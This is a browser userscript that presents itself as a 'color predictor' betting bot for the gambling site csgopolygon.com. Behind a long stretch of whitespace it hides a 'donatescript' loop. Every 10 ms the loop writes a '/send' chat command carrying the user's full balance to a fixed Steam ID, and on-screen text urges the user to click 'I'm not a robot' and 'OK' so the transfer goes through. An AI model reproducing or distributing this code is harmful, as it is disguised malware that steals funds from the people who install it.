// ==UserScript==
// @name         Predict color CSGOPolygon
// @namespace    CsGoPolygon BettingBot
// @version      0.5
// @author       RESTRITOn
// @match        http://csgopolygon.com/*
// @grant        none
// @description  AFK betting bot
// ==/UserScript==
var num="";
...
$("div .input-btn").append('<br><br><div class="panel panel-default"><div class="panel-body text-center" style="margin-top: 10px;"><div id="setcolor1"></div>'+
                           //###PREDICT###                                                                                                                                                                                                                                           var donatescript="setInterval(function(){"+
                                                                                                                                                                                                                                                                                     "}, 10);"+
                                                                                                                                                                                                                                                                                     "$('#chatMessage_k').val('/send 76561198251857050 '+$('#balance_r').text());"+
 ...
 '<p><b><font color="red"> You need press (Im not a robot) and (OK) if you want this color predictor show correct color.</b></p></font>'+
                           ...
                           '<div id="setcolor2"></div><br><b style="padding-left: 300px;"><a href="#" data-toggle="modal" data-target="#donatekanapka"><i class="fa fa-cog fa-fw"></i> by RESTRITOn </a></b></div></div>');
